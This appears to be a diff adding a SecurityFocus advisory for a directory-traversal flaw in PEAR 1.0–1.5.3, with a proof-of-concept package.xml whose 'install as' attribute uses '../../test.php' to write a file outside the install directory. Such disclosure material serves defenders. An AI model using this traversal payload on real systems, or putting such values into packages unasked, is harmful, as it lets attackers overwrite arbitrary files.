@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/24111/info
+
+PEAR is prone to a vulnerability that lets attackers overwrite arbitrary files.
+
+An attacker-supplied package may supply directory-traversal strings through the 'install-as' attribute to create and overwrite files in arbitrary locations.
+
+This issue affects PEAR 1.0 to 1.5.3. 
+
+create a file named "INSTALL" and save it in the current directory.
+Save the following XML as package.xml, and run "pear install package.xml"
+
+If php_dir is /usr/local/lib/php The file "INSTALL" will be installed into
+/usr/local/test.php
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<package version="2.0" xmlns="http://pear.php.net/dtd/package-2.0"
+xmlns:tasks="http://pear.php.net/dtd/tasks-1.0"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="http://pear.php.net/dtd/tasks-1.0
+http://pear.php.net/dtd/tasks-1.0.xsd
+http://pear.php.net/dtd/package-2.0
+http://pear.php.net/dtd/package-2.0.xsd">
+ <name>Test_Sec</name>
+ <channel>pear.php.net</channel>
+ <summary>Test security vulnerability</summary>
+ <description>demonstrate install-as vulnerability
+ </description>
+ <lead>
+  <name>Greg Beaver</name>
+  <user>cellog</user>
+  <email>cellog@php.net</email>
+  <active>yes</active>
+ </lead>
+ <date>2007-03-05</date>
+ <version>
+  <release>1.6.0</release>
+  <api>1.6.0</api>
+ </version>
+ <stability>
+  <release>stable</release>
+  <api>stable</api>
+ </stability>
+ <license uri="http://www.php.net/license">PHP License</license>
+ <notes>
+    allow up to latest beta version [tias]
+ </notes>
+ <contents>
+  <dir name="/">
+   <file name="INSTALL" role="php" />
+  </dir> <!-- / -->
+ </contents>
+ <dependencies>
+  <required>
+   <php>
+    <min>4.3.0</min>
+   </php>
+   <pearinstaller>
+    <min>1.4.3</min>
+   </pearinstaller>
+  </required>
+ </dependencies>
+ <phprelease>
+  <filelist>
+   <install as="../../test.php" name="INSTALL" />
+  </filelist>
+ </phprelease>
+
+</package>
